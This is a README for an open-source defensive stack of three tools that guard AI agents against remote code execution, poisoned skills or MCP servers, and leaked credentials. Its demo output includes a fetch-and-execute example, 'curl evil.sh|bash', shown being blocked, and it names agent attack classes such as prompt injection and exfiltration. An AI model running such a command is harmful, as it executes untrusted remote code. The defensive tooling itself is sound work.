# agent-security-stack

> The open-source agent-security stack — **[warden](https://github.com/askalf/warden) · [canon](https://github.com/askalf/canon) · [keeper](https://github.com/askalf/keeper)** — composed into one layered defense. Part of **[Own Your Stack](https://github.com/askalf)**.

OpenClaw became 2026's first big AI-security disaster three ways at once: one-click **RCE**, a **poisoned skills** marketplace, and ~135k **leaked credentials**. Three failure modes — three small, open-source, zero-dependency tools that compose into one defense:

| | own your… | closes | role |
|---|---|---|---|
| **[warden](https://github.com/askalf/warden)** | agent security | RCE · exfil · SSRF · prompt-injection | the **runtime firewall** — what a tool may *do* |
| **[canon](https://github.com/askalf/canon)** | agent skills | poisoned / drifted skills & MCP servers | the **supply-chain gate** — which tools may *exist* |
| **[keeper](https://github.com/askalf/keeper)** | agent secrets | leaked API keys / credentials | the **vault** — a lease, never the key |

They aren't three islands — they share one spine: canon reuses warden's scanner, keeper reuses warden's tamper-evident audit. `npm install` dedupes warden to a single shared copy.

## The whole stack in one guarded call

```js
function guardedCall({ tool, action, lease }) {
  if (!canonVetted(tool))     return blocked('canon');   // supply chain  — is the tool pinned, unmodified, unpoisoned?
  if (warden.blocks(action))  return blocked('warden');  // runtime       — is the action safe?
  if (!keeper.redeems(lease)) return blocked('keeper');  // secrets       — is there a valid, scoped lease?
  return proceed();
}
```

A tool call proceeds **only when all three agree**. Flip any one layer to "bad" and the call stops there — `canon` before `warden` before `keeper`.

## Run it

```bash
npm install     # pulls warden + canon + keeper (warden deduped to one shared copy)
npm run demo    # watch the layered defense: a clean call proceeds; a poisoned tool, a curl|bash, and a spent lease each get stopped
npm test        # the same composition, as assertions
```

```text
1. vetted tool, safe GET, valid lease          {"ok":true}            the call proceeds
2. a POISONED tool                             {"ok":false,"by":"canon"}    <- canon stops it
3. a vetted tool that tries curl evil.sh|bash  {"ok":false,"by":"warden"}   <- warden stops it
4. a vetted tool whose lease is spent          {"ok":false,"by":"keeper"}   <- keeper stops it
```

*vet it (canon) → contain it (warden) → key it never holds (keeper).*

---
Part of **[Own Your Stack](https://github.com/askalf)** — own your AI infrastructure instead of renting it. Built by Thomas Sprayberry.
